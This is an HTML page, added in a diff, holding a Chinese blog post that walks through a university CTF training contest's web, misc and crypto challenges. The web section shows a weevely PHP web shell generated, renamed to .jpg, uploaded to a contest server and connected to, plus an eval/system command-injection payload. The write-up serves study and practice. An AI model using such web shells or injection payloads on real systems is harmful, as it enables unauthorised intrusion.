@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <!-- RSS / Atom -->
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      renderMathInElement(document.body, {
+        delimiters: [
+          {left: "$$", right: "$$", display: true},
+          {left: "\\[", right: "\\]", display: true},
+          {left: "$",  right: "$",  display: false},
+          {left: "\\(", right: "\\)", display: false}
+        ],
+        throwOnError: false,   // 避免个别符号导致整段失败
+        macros: {
+          "\\sgn": "\\operatorname{sgn}"  // 你文中用到的 sgn，统一为运算符
+        }
+      });
+    });
+  </script> -->
+    <!-- <script>
+      window.MathJax = {
+        tex: {
+          packages: {'[+]': ['ams']},   // cases / aligned 需要 ams
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$','$$'], ['\\[','\\]']],
+          tags: 'ams'
+        },
+        options: { skipHtmlTags: ['script','style','textarea','pre','code'] }
+      };
+    </script>
+    <script async id="MathJax-script"
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script> -->
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <title>现充|junyu33</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="head-nav">
+	<div class="inner">
+		<a href="/">
+			现充|junyu33
+		</a>
+		<div class="right">
+			
+				<a href="/zh">首页</a>
+				<a href="/zh/archives">归档</a>
+				
+					<a href="/zh/categories">Categories</a>
+				
+				
+					<a href="/zh/tags">Tags</a>
+				
+				<a href="/">English</a>
+			
+		</div>
+	</div>
+</div>
+
+  <div class="main">
+    <div class="post">
+    
+
+	<h1>四川大学CTF实训杯wp</h1>
+	<p>就是课上讲的那点东西，比我一年前备战校测的内容还要简单。</p>
+<span id="more"></span>
+<h2 id="WEB">WEB</h2>
+<h3 id="Easy-Flag">Easy_Flag</h3>
+<p>ctrl+u，查看源代码：</p>
+<pre><code class="language-html">&lt;meta http-equiv=&quot;&quot; content=&quot;&quot;  charset=&quot;utf-8&quot;/&gt;
+空空如也～
+&lt;!--flag.php--&gt;
+&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot;&gt;
+    
+    document.oncontextmenu = function() &#123;
+        event.returnValue = false;
+        alert('想看代码？');
+    &#125;;
+   
+    document.onkeydown = document.onkeyup = document.onkeypress = function(event) &#123;
+        let e = event || window.event || arguments.callee.caller.arguments[0];
+        if (e &amp;&amp; e.keyCode == 123) &#123;
+            e.returnValue = false;
+            alert('没想到吧，这也不行？');
+            return false;
+        &#125;
+    &#125;;
+&lt;/script&gt;
+</code></pre>
+<p>按照提示查看/flag.php即可。</p>
+<h3 id="Easy-Button">Easy_Button</h3>
+<p>f12将<code>maxlength</code>改为50，hackbar里面随便post一个手机号。</p>
+<p>如<code>phone=12312312312</code></p>
+<h3 id="Easy-Browser">Easy_Browser</h3>
+<p>查看源码：</p>
+<pre><code class="language-html">    &lt;html&gt;
+    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
+    &lt;body&gt;
+        页面什么也没有
+        &lt;!--看看cookie里有什么--&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+</code></pre>
+<p>按照提示查看cookie</p>
+<img src='https://img.junyu33.me/blog/easiestctf/1.png'>
+<p>访问/get.php，要求提交一个参数名为flag，参数值为1的数据。</p>
+<p><code>/get.php?flag=1</code></p>
+<h3 id="旋转的木马">旋转的木马</h3>
+<p>盲猜upload.php，发现提供了上传图片的按钮。</p>
+<p>我这里是linux，没法装蚁剑，这里使用weevely。</p>
+<pre><code class="language-shell">weevely generate 1234 ./114514.php
+mv 114514.php 114514.jpg
+</code></pre>
+<p>提交时使用burp抓包，将后缀再改回php即可。</p>
+<pre><code class="language-shell">weevely http://47.116.24.9:81/upload/114514.php 1234
+</code></pre>
+<p>进入shell之后</p>
+<pre><code class="language-shell">ls
+cat flag_859421239.txt
+</code></pre>
+<h3 id="抽奖游戏">抽奖游戏</h3>
+<p>抽奖之后抓包：</p>
+<pre><code class="language-http">GET /ctf4/check.php?tar=12&amp;sign= HTTP/1.1
+Host: 47.116.24.9
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Referer: http://47.116.24.9/ctf4/game.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: sign=md5(tar)
+Connection: close
+</code></pre>
+<p>盲猜<code>tar=flag</code>，然后<code>sign=md5('flag')=327a6c4304ad5938eaf0efb6cc3e53dc</code></p>
+<p>把<code>GET</code>参数修改后提交即可。</p>
+<h3 id="Rceeeee">Rceeeee</h3>
+<p>过滤逃逸：</p>
+<p><code>?data=eval($_GET[1]);&amp;1=system('ls');</code></p>
+<p>剩下的自己看着办。</p>
+<h2 id="Misc">Misc</h2>
+<h3 id="葫芦娃">葫芦娃</h3>
+<p>解压后改png图片高度。</p>
+<img src='https://img.junyu33.me/blog/easiestctf/2.png'>
+<h3 id="File-Error">File_Error</h3>
+<p>这是一个zip文件，是一个伪加密。</p>
+<img src='https://img.junyu33.me/blog/easiestctf/3.png'>
+<h3 id="shark">shark</h3>
+<p>题目说flag只靠搜，那就直接搜呗。</p>
+<pre><code class="language-shell">cat webone.pcap | grep -a flag
+</code></pre>
+<h2 id="Crypto">Crypto</h2>
+<h3 id="签到题">签到题</h3>
+<p>urldecode</p>
+<p><a target="_blank" rel="noopener" href="https://www.urldecoder.io/">https://www.urldecoder.io/</a></p>
+<h3 id="栅栏围墙">栅栏围墙</h3>
+<p>栅栏密码</p>
+<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p>
+<p>每组字数9</p>
+<h3 id="罗密欧与朱丽叶">罗密欧与朱丽叶</h3>
+<p>盲文密码、猪圈密码和圣堂武士密码的结合，一个一个解就行。</p>
+
+</div>
+
+
+  </div>
+</body>
+</html>
+
